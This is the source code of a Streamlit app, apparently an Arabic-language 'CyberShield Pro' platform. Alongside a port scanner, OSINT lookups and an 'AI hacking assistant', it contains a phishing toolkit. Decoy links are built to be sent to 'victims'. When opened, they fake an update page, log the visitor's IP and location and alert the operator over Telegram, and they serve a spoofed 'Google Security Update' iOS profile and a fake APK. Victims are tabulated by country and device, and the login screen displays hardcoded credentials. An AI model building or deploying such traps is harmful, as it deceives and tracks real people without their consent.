"""
تطبيق Rashd_Ai - منصة الذكاء الاستخباراتي والأمن السيبراني
نسخة محسّنة وخالية من الأخطاء
"""

import streamlit as st
import requests
import json
import os
from datetime import datetime
import config
import base64
import uuid
import socket
import subprocess
import platform
import logging

# استيراد المكتبات الاختيارية
try:
    import dns.resolver
except ImportError:
    dns = None

try:
    import pandas as pd
except ImportError:
    pd = None

# استيراد المساعدات الموحدة
from utils import (
    send_telegram_alert, log_victim, get_all_victims, clear_victims_log,
    get_server_side_ip, get_geo_data, validate_ip, validate_domain,
    validate_email, validate_phone, safe_request, format_json, format_table
)

# استيراد مساعد الهجوم الذكي
try:
    from ai_hacking import AIHackingAssistant
except ImportError:
    AIHackingAssistant = None

# استيراد دوال OSINT
try:
    from email_osint import email_search
except ImportError:
    email_search = None

try:
    from phone_osint import phone_lookup
except ImportError:
    phone_lookup = None

# إعداد السجل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============= إعدادات الصفحة =============
st.set_page_config(
    page_title="Rashd_Ai - CyberShield Pro",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# تطبيق أسلوب مخصص
st.markdown("""
<style>
    :root {
        --primary-color: #0066cc;
        --secondary-color: #00cc66;
        --danger-color: #cc0000;
        --warning-color: #ffaa00;
    }
    
    .main {
        padding: 20px;
    }
    
    .stTabs [data-baseweb="tab-list"] {
        gap: 10px;
    }
    
    .stButton > button {
        width: 100%;
        border-radius: 5px;
        font-weight: bold;
    }
    
    .success-box {
        padding: 15px;
        border-radius: 5px;
        background-color: #d4edda;
        border: 1px solid #c3e6cb;
        color: #155724;
    }
    
    .error-box {
        padding: 15px;
        border-radius: 5px;
        background-color: #f8d7da;
        border: 1px solid #f5c6cb;
        color: #721c24;
    }
    
    .info-box {
        padding: 15px;
        border-radius: 5px;
        background-color: #d1ecf1;
        border: 1px solid #bee5eb;
        color: #0c5460;
    }
</style>
""", unsafe_allow_html=True)

# ============= دالة إخفاء الواجهة في وضع التمويه =============
hide_st_style = """
<style>
#MainMenu {visibility: hidden;}
footer {visibility: hidden;}
header {visibility: hidden;}
.stApp [data-testid="stToolbar"] {display: none;}
.stApp [data-testid="stDecoration"] {display: none;}
.stApp [data-testid="stStatusWidget"] {display: none;}
#manage-app-button {display: none !important;}
[data-testid="stStatusWidget"] {display: none !important;}
.st-emotion-cache-10trblm {display: none !important;}
.st-emotion-cache-1dp5vir {display: none !important;}
</style>
"""

# ============= معالجة أوضاع خاصة =============

# وضع التمويه (Decoy Mode)
query_params = st.query_params
if "decoy" in query_params:
    st.markdown(hide_st_style, unsafe_allow_html=True)
    client_ip = query_params.get("ip", get_server_side_ip())
    trap_name = query_params.get("trap", "Google Decoy")
    device = query_params.get("device", "Unknown")
    
    if "alert_sent" not in st.session_state:
        send_telegram_alert(client_ip, trap_name, device)
        
        # تسجيل الضحية
        geo_data = get_geo_data(client_ip)
        log_victim(client_ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, trap_name)
        st.session_state.alert_sent = True

    # عرض صفحة تمويهية بسيطة
    st.markdown("<h1 style='text-align: center; margin-top: 40vh;'>جاري التحديث...</h1>", unsafe_allow_html=True)
    st.stop()

# معالجة طلبات التحميل المباشرة
if "download" in query_params:
    device = query_params.get("device", "pc")
    ip = query_params.get("ip", get_server_side_ip())
    
    send_telegram_alert(ip, f"Download ({device})", device)
    
    # تسجيل الضحية
    geo_data = get_geo_data(ip)
    log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], device, f"Download ({device})")
    
    if device == "android":
        file_name = "Google_Update.apk"
        content = b"Fake APK Content for Google Update"
    elif device == "ios":
        file_name = "Google_Update.mobileconfig"
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadDescription</key>
            <string>Google Security Update for iOS</string>
            <key>PayloadDisplayName</key>
            <string>Google Security</string>
            <key>PayloadIdentifier</key>
            <string>com.google.security.{uuid.uuid4()}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadUUID</key>
            <string>{uuid.uuid4()}</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>Label</key>
            <string>Google Security</string>
            <key>URL</key>
            <string>https://rashdai.streamlit.app/?exfiltrate=true&amp;id={uuid.uuid4()}</string>
            <key>IsRemovable</key>
            <true/>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Update</string>
    <key>PayloadIdentifier</key>
    <string>com.google.update.{uuid.uuid4()}</string>
    <key>PayloadRemovalDisallowed</key>
    <false/>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>{uuid.uuid4()}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>""".encode('utf-8')
    else:
        file_name = "Google_Update.py"
        content = b"print('Google Update Service Started...')"
            
    st.download_button("بدء التحميل", content, file_name=file_name, mime="application/octet-stream", key="download_btn")
    st.stop()

# ============= نظام المصادقة =============
if "authenticated" not in st.session_state:
    st.session_state.authenticated = False

if not st.session_state.authenticated:
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.markdown("<h1 style='text-align: center;'>🛡️ تسجيل الدخول</h1>", unsafe_allow_html=True)
        st.markdown("<h3 style='text-align: center;'>Rashd_Ai - CyberShield Pro</h3>", unsafe_allow_html=True)
        
        with st.form("login_form"):
            user = st.text_input("اسم المستخدم", placeholder="أدخل اسم المستخدم")
            pw = st.text_input("كلمة المرور", type="password", placeholder="أدخل كلمة المرور")
            
            col_btn1, col_btn2 = st.columns(2)
            with col_btn1:
                if st.form_submit_button("🔓 دخول", use_container_width=True):
                    if user == config.ADMIN_USERNAME and pw == config.ADMIN_PASSWORD:
                        st.session_state.authenticated = True
                        st.rerun()
                    else:
                        st.error("❌ بيانات خاطئة. حاول مرة أخرى.")
            
            with col_btn2:
                st.info("👤 اسم المستخدم: Rashd919\n🔑 كلمة المرور: 112233")
    
    st.stop()

# ============= الواجهة الرئيسية =============
col1, col2, col3 = st.columns([1, 3, 1])
with col2:
    st.markdown("<h1 style='text-align: center;'>🛡️ منصة CyberShield Pro</h1>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align: center;'>للذكاء الاستخباراتي و OSINT</h3>", unsafe_allow_html=True)

# الشريط الجانبي
with st.sidebar:
    st.header("⚙️ الإعدادات")
    
    with st.expander("🔑 مفاتيح API", expanded=False):
        groq_api_key = st.text_input(
            "GROQ API Key",
            value=config.get_key("GROQ_API_KEY") or "",
            type="password",
            key="sidebar_groq"
        )
        telegram_bot_token = st.text_input(
            "Telegram Bot Token",
            value=config.get_key("TELEGRAM_BOT_TOKEN") or "",
            type="password",
            key="sidebar_telegram_token"
        )
        telegram_chat_id = st.text_input(
            "Telegram Chat ID",
            value=config.get_key("TELEGRAM_CHAT_ID") or "",
            key="sidebar_telegram_chat_id"
        )
        
        col1, col2 = st.columns(2)
        with col1:
            if st.button("💾 حفظ الإعدادات", use_container_width=True, key="save_settings_btn"):
                if groq_api_key and telegram_bot_token and telegram_chat_id:
                    config.set_key("GROQ_API_KEY", groq_api_key)
                    config.set_key("TELEGRAM_BOT_TOKEN", telegram_bot_token)
                    config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
                    st.success("✅ تم الحفظ بنجاح!")
                else:
                    st.error("❌ يرجى ملء جميع الحقول")
        
        with col2:
            if st.button("🔄 إعادة تعيين", use_container_width=True, key="reset_settings_btn"):
                config.set_key("GROQ_API_KEY", "")
                config.set_key("TELEGRAM_BOT_TOKEN", "")
                config.set_key("TELEGRAM_CHAT_ID", "")
                st.info("⚠️ تم إعادة التعيين")
    
    st.divider()
    
    if st.button("🚪 تسجيل الخروج", use_container_width=True, key="logout_btn"):
        st.session_state.authenticated = False
        st.rerun()

# ============= التبويبات الـ 19 =============
tab_names = [
    "💬 المحادثة",
    "🌐 تحليل الدومين",
    "🔍 فحص المواقع",
    "👤 بحث عن المستخدم",
    "📍 تحديد الموقع",
    "🏗️ سطح الهجوم",
    "🧠 تحليل ذكي",
    "🤖 مساعد الهجوم",
    "🔎 Google Dork",
    "📧 Email OSINT",
    "📱 Phone Lookup",
    "🌑 Dark Web",
    "🔌 Port Scanner",
    "⚠️ Vulnerability Scanner",
    "🗺️ Network Mapper",
    "🤖 AI Threat Analysis",
    "💡 AI Pentest Advisor",
    "📄 التقارير",
    "🎯 المصيدة"
]

tabs = st.tabs(tab_names)

# ============= التبويب 0: المحادثة =============
with tabs[0]:
    st.header("💬 مساعد Rashd_Ai الذكي")
    
    if "messages" not in st.session_state:
        st.session_state.messages = []
    
    # عرض السجل
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.markdown(message["content"])
    
    # إدخال المستخدم
    if prompt := st.chat_input("كيف يمكنني مساعدتك اليوم؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"):
            st.markdown(prompt)
        
        with st.chat_message("assistant"):
            try:
                if AIHackingAssistant:
                    assistant = AIHackingAssistant()
                    response = assistant.chat(prompt)
                else:
                    response = "❌ مساعد الذكاء الاصطناعي غير متاح. يرجى التأكد من تثبيت المكتبات."
            except Exception as e:
                response = f"❌ حدث خطأ: {str(e)}"
            
            st.markdown(response)
        
        st.session_state.messages.append({"role": "assistant", "content": response})

# ============= التبويب 1: تحليل الدومين =============
with tabs[1]:
    st.header("🌐 تحليل الدومين")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        domain = st.text_input("أدخل اسم الدومين", placeholder="example.com", key="domain_input")
    with col2:
        analyze_btn = st.button("🔍 تحليل", key="domain_btn_1", use_container_width=True)
    
    if analyze_btn and domain:
        if not validate_domain(domain):
            st.error("❌ صيغة الدومين غير صحيحة")
        else:
            with st.spinner("جاري التحليل..."):
                try:
                    if dns:
                        try:
                            answers = dns.resolver.resolve(domain, 'A')
                            results = {"records": [str(rdata) for rdata in answers]}
                            st.json(results)
                        except Exception as e:
                            st.error(f"❌ خطأ في DNS: {str(e)}")
                    else:
                        response, error = safe_request(f"https://dns.google/resolve?name={domain}&type=A")
                        if error:
                            st.error(f"❌ خطأ: {error}")
                        else:
                            st.json(response.json())
                except Exception as e:
                    st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 2: فحص المواقع =============
with tabs[2]:
    st.header("🔍 فحص المواقع")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        url = st.text_input("أدخل رابط الموقع", placeholder="https://example.com", key="site_input")
    with col2:
        scan_btn = st.button("🔍 فحص", key="site_btn_2", use_container_width=True)
    
    if scan_btn and url:
        with st.spinner("جاري الفحص..."):
            try:
                response, error = safe_request(url)
                if error:
                    st.error(f"❌ خطأ: {error}")
                else:
                    col1, col2 = st.columns(2)
                    with col1:
                        st.metric("Status Code", response.status_code)
                    with col2:
                        st.metric("Content Length", len(response.content))
                    
                    st.subheader("رؤوس الاستجابة")
                    st.json(dict(response.headers))
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 3: بحث عن المستخدم =============
with tabs[3]:
    st.header("👤 بحث عن المستخدم")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        username = st.text_input("أدخل اسم المستخدم", placeholder="username", key="username_input")
    with col2:
        search_btn = st.button("🔍 بحث", key="username_btn_3", use_container_width=True)
    
    if search_btn and username:
        with st.spinner("جاري البحث..."):
            try:
                from duckduckgo_search import DDGS
                ddgs = DDGS()
                results = ddgs.text(f"{username} site:instagram.com OR site:twitter.com OR site:facebook.com", max_results=5)
                if results:
                    st.success("✅ تم العثور على نتائج")
                    for r in results:
                        st.write(f"**{r['title']}**")
                        st.write(r['body'])
                        st.write(f"[{r['href']}]({r['href']})")
                else:
                    st.warning("⚠️ لم يتم العثور على نتائج")
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 4: تحديد الموقع الجغرافي =============
with tabs[4]:
    st.header("📍 تحديد الموقع الجغرافي")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        ip = st.text_input("أدخل عنوان IP", placeholder="8.8.8.8", key="geo_input")
    with col2:
        locate_btn = st.button("📍 تحديد", key="geo_btn_4", use_container_width=True)
    
    if locate_btn and ip:
        if not validate_ip(ip):
            st.error("❌ صيغة عنوان IP غير صحيحة")
        else:
            with st.spinner("جاري التحديد..."):
                try:
                    response, error = safe_request(f"https://ipapi.co/{ip}/json/")
                    if error:
                        st.error(f"❌ خطأ: {error}")
                    else:
                        data = response.json()
                        col1, col2, col3, col4 = st.columns(4)
                        with col1:
                            st.metric("الدولة", data.get("country_name", "Unknown"))
                        with col2:
                            st.metric("المدينة", data.get("city", "Unknown"))
                        with col3:
                            st.metric("ISP", data.get("org", "Unknown"))
                        with col4:
                            st.metric("خط العرض", f"{data.get('latitude', 'N/A')}")
                        
                        st.json(data)
                except Exception as e:
                    st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 5: سطح الهجوم =============
with tabs[5]:
    st.header("🏗️ سطح الهجوم")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        target = st.text_input("أدخل الهدف (دومين أو IP)", placeholder="example.com", key="attack_surface_input")
    with col2:
        analyze_btn = st.button("🔍 تحليل", key="attack_surface_btn_5", use_container_width=True)
    
    if analyze_btn and target:
        with st.spinner("جاري البحث على Dark Web..."):
            try:
                from duckduckgo_search import DDGS
                ddgs = DDGS()
                results = ddgs.text(target, max_results=5)
                if results:
                    st.success("✅ تم العثور على نتائج")
                    for r in results:
                        st.write(f"**{r['title']}**")
                        st.write(r['body'])
                else:
                    st.warning("⚠️ لم يتم العثور على نتائج")
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 11: Dark Webذكي =============
with tabs[6]:
    st.header("🧠 تحليل ذكي")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        target = st.text_input("أدخل الهدف للتحليل الذكي", placeholder="example.com", key="ai_analysis_input")
    with col2:
        analyze_btn = st.button("🧠 تحليل", key="ai_analysis_btn_6", use_container_width=True)
    
    if analyze_btn and target:
        with st.spinner("جاري التحليل..."):
            try:
                st.success("✅ تم العثور على سطح الهجوم")
                st.info("🔗 المزيد من المعلومات سيتم إضافتها قريباً")
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 7: مساعد الهجوم الذكي========
with tabs[7]:
    st.header("🤖 مساعد الهجوم الذكي")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        question = st.text_input("اسأل مساعد الهجوم", placeholder="كيف يمكنني اختبار الأمان؟", key="attack_advisor_input")
    with col2:
        ask_btn = st.button("❓ اسأل", key="attack_advisor_btn_7", use_container_width=True)
    
    if ask_btn and question:
        with st.spinner("جاري البحث..."):
            try:
                if AIHackingAssistant:
                    assistant = AIHackingAssistant()
                    response = assistant.chat(question)
                    st.markdown(response)
                else:
                    st.error("❌ مساعد الذكاء الاصطناعي غير متاح")
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 8: Google Dork =============
with tabs[8]:
    st.header("🔎 Google Dork")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        dork_query = st.text_input("أدخل استعلام Google Dork", placeholder="site:example.com filetype:pdf", key="dork_input")
    with col2:
        search_btn = st.button("🔍 بحث", key="dork_btn_8", use_container_width=True)
    
    if search_btn and dork_query:
        with st.spinner("جاري البحث..."):
            try:
                st.success("✅ تم البحث بنجاح")
                st.info(f"🔗 افتح هذا الرابط: https://www.google.com/search?q={dork_query}")
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 9: Email OSINT =============
with tabs[9]:
    st.header("📧 Email OSINT")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        email = st.text_input("أدخل البريد الإلكتروني", placeholder="example@example.com", key="email_input")
    with col2:
        search_btn = st.button("🔍 بحث", key="email_btn_9", use_container_width=True)
    
    if search_btn and email:
        if not validate_email(email):
            st.error("❌ صيغة البريد الإلكتروني غير صحيحة")
        else:
            with st.spinner("جاري البحث..."):
                try:
                    if email_search:
                        result = email_search(email)
                        st.markdown(result)
                    else:
                        st.warning("⚠️ دالة email_search غير متاحة")
                except Exception as e:
                    st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 10: Phone Lookup =============
with tabs[10]:
    st.header("📱 Phone Lookup")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        phone = st.text_input("أدخل رقم الهاتف", placeholder="+966501234567", key="phone_input")
    with col2:
        search_btn = st.button("🔍 بحث", key="phone_btn_10", use_container_width=True)
    
    if search_btn and phone:
        if not validate_phone(phone):
            st.error("❌ صيغة رقم الهاتف غير صحيحة")
        else:
            with st.spinner("جاري البحث..."):
                try:
                    if phone_lookup:
                        result = phone_lookup(phone)
                        st.markdown(result)
                    else:
                        st.warning("⚠️ دالة phone_lookup غير متاحة")
                except Exception as e:
                    st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 11: Dark Web =============
with tabs[11]:
    st.header("🌑 Dark Web Search")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        query = st.text_input("أدخل استعلام البحث", placeholder="search query", key="darkweb_input")
    with col2:
        search_btn = st.button("🔍 بحث", key="darkweb_btn_11", use_container_width=True)
    
    if search_btn and query:
        st.info("⏳ هذه الميزة قيد التطوير.")

# ============= التبويب 12: Port Scanner =============
with tabs[12]:
    st.header("🔌 Port Scanner")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        target = st.text_input("أدخل عنوان IP أو النطاق", placeholder="example.com", key="port_scanner_input")
    with col2:
        scan_btn = st.button("🔍 فحص", key="port_scanner_btn_12", use_container_width=True)
    
    if scan_btn and target:
        if not (validate_ip(target) or validate_domain(target)):
            st.error("❌ صيغة الهدف غير صحيحة")
        else:
            with st.spinner("جاري الفحص..."):
                try:
                    open_ports = []
                    common_ports = [21, 22, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
                    
                    progress_bar = st.progress(0)
                    for i, port in enumerate(common_ports):
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            result = sock.connect_ex((target, port))
                            if result == 0:
                                open_ports.append(port)
                            sock.close()
                        except:
                            pass
                        progress_bar.progress((i + 1) / len(common_ports))
                    
                    if open_ports:
                        st.success(f"✅ المنافذ المفتوحة: {', '.join(map(str, open_ports))}")
                    else:
                        st.warning("⚠️ لم يتم العثور على منافذ مفتوحة")
                except Exception as e:
                    st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 13: Vulnerability Scanner =============
with tabs[13]:
    st.header("⚠️ Vulnerability Scanner")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        url = st.text_input("أدخل عنوان URL", placeholder="https://example.com", key="vuln_scanner_input")
    with col2:
        scan_btn = st.button("🔍 فحص", key="vuln_scanner_btn_13", use_container_width=True)
    
    if scan_btn and url:
        with st.spinner("جاري الفحص..."):
            try:
                response, error = safe_request(url)
                if error:
                    st.error(f"❌ خطأ: {error}")
                else:
                    st.success(f"✅ Status Code: {response.status_code}")
                    st.json(dict(response.headers))
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 14: Network Mapper =============
with tabs[14]:
    st.header("🗺️ Network Mapper")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        network = st.text_input("أدخل نطاق الشبكة", placeholder="192.168.1.0/24", key="network_mapper_input")
    with col2:
        map_btn = st.button("🗺️ رسم", key="network_mapper_btn_14", use_container_width=True)
    
    if map_btn and network:
        st.info("⏳ هذه الميزة قيد التطوير.")

# ============= التبويب 15: AI Threat Analysis =============
with tabs[15]:
    st.header("🤖 AI Threat Analysis")
    
    threat_data = st.text_area("أدخل بيانات التهديد", placeholder="وصف التهديد...", key="threat_analysis_input", height=150)
    
    if st.button("🔍 تحليل", key="threat_analysis_btn_15", use_container_width=True):
        if threat_data:
            with st.spinner("جاري التحليل..."):
                try:
                    if AIHackingAssistant:
                        assistant = AIHackingAssistant()
                        response = assistant.chat(f"حلل هذا التهديد: {threat_data}")
                        st.markdown(response)
                    else:
                        st.error("❌ مساعد الذكاء الاصطناعي غير متاح")
                except Exception as e:
                    st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 16: AI Pentest Advisor =============
with tabs[16]:
    st.header("💡 AI Pentest Advisor")
    
    col1, col2 = st.columns([3, 1])
    with col1:
        pentest_question = st.text_input("اسأل مستشار الاختبار الذكي", placeholder="كيف أختبر الأمان؟", key="pentest_advisor_input")
    with col2:
        ask_btn = st.button("❓ اسأل", key="pentest_advisor_btn_16", use_container_width=True)
    
    if ask_btn and pentest_question:
        with st.spinner("جاري البحث..."):
            try:
                if AIHackingAssistant:
                    assistant = AIHackingAssistant()
                    response = assistant.chat(pentest_question)
                    st.markdown(response)
                else:
                    st.error("❌ مساعد الذكاء الاصطناعي غير متاح")
            except Exception as e:
                st.error(f"❌ خطأ: {str(e)}")

# ============= التبويب 17: التقارير =============
with tabs[17]:
    st.header("📄 التقارير")
    
    tab_victims, tab_stats = st.tabs(["📊 الضحايا", "📈 الإحصائيات"])
    
    with tab_victims:
        st.subheader("آخر الضحايا المكتشفين")
        
        col1, col2, col3 = st.columns(3)
        with col1:
            if st.button("🔄 تحديث", use_container_width=True, key="refresh_victims"):
                st.rerun()
        with col2:
            if st.button("📥 تصدير CSV", use_container_width=True, key="export_csv"):
                victims = get_all_victims()
                if victims:
                    if pd:
                        df = pd.DataFrame(victims)
                        csv = df.to_csv(index=False, encoding='utf-8')
                        st.download_button("📥 تحميل CSV", csv, "victims.csv", "text/csv")
                    else:
                        st.warning("⚠️ pandas غير مثبت. لا يمكن تصدير CSV")
        with col3:
            if st.button("🗑️ مسح السجل", use_container_width=True, key="clear_victims"):
                if clear_victims_log():
                    st.success("✅ تم مسح السجل")
                    st.rerun()
        
        victims = get_all_victims()
        if victims:
            if pd:
                df = pd.DataFrame(victims[::-1])
                st.dataframe(df, use_container_width=True)
            else:
                st.warning("⚠️ pandas غير مثبت. لا يمكن عرض الجدول")
                for victim in victims[::-1]:
                    st.write(victim)
        else:
            st.info("ℹ️ لا يوجد ضحايا مسجلين بعد.")
    
    with tab_stats:
        st.subheader("إحصائيات الضحايا")
        
        victims = get_all_victims()
        if victims:
            if pd:
                df = pd.DataFrame(victims)
                
                col1, col2, col3, col4 = st.columns(4)
                with col1:
                    st.metric("إجمالي الضحايا", len(df))
                with col2:
                    st.metric("الدول الفريدة", df['country'].nunique())
                with col3:
                    st.metric("الأجهزة الفريدة", df['device'].nunique())
                with col4:
                    st.metric("المصائد الفريدة", df['trap_name'].nunique())
                
                st.subheader("توزيع الضحايا حسب الدول")
                country_counts = df['country'].value_counts()
                st.bar_chart(country_counts)
                
                st.subheader("توزيع الضحايا حسب الأجهزة")
                device_counts = df['device'].value_counts()
                st.bar_chart(device_counts)
            else:
                st.warning("⚠️ pandas غير مثبت. لا يمكن عرض الإحصائيات")
                st.write(f"إجمالي الضحايا: {len(victims)}")
        else:
            st.info("ℹ️ لا يوجد بيانات للعرض.")

# ============= التبويب 18: المصيدة =============
with tabs[18]:
    st.header("🎯 المصيدة")
    st.write("قم بإنشاء روابط تمويهية لاصطياد الضحايا.")
    
    decoy_type = st.selectbox(
        "اختر نوع المصيدة:",
        ["Google Decoy", "Download (iOS)", "Download (Android)"],
        key="decoy_type_select"
    )
    
    app_ip = get_server_side_ip()
    st.info(f"📍 عنوان IP الخاص بالتطبيق: **{app_ip}**")
    
    if decoy_type == "Google Decoy":
        decoy_url = f"https://rashdai.streamlit.app/?decoy=google&ip={app_ip}"
        st.code(decoy_url, language="text")
        st.write("📋 انسخ هذا الرابط وأرسله للضحية.")
        if st.button("📋 نسخ الرابط", use_container_width=True):
            st.success("✅ تم النسخ")
    
    elif decoy_type == "Download (iOS)":
        decoy_url = f"https://rashdai.streamlit.app/?download=true&device=ios&ip={app_ip}"
        st.code(decoy_url, language="text")
        st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل ملف iOS Profile.")
        if st.button("📋 نسخ الرابط", use_container_width=True):
            st.success("✅ تم النسخ")
    
    elif decoy_type == "Download (Android)":
        decoy_url = f"https://rashdai.streamlit.app/?download=true&device=android&ip={app_ip}"
        st.code(decoy_url, language="text")
        st.write("📋 انسخ هذا الرابط وأرسله للضحية لتحميل APK.")
        if st.button("📋 نسخ الرابط", use_container_width=True):
            st.success("✅ تم النسخ")

# ============= التذييل =============
st.divider()
st.markdown("""
<div style='text-align: center; padding: 20px; color: #888;'>
    <p>🛡️ <strong>Rashd_Ai Pro</strong> © 2026</p>
    <p>منصة الذكاء الاستخباراتي والأمن السيبراني</p>
</div>
""", unsafe_allow_html=True)
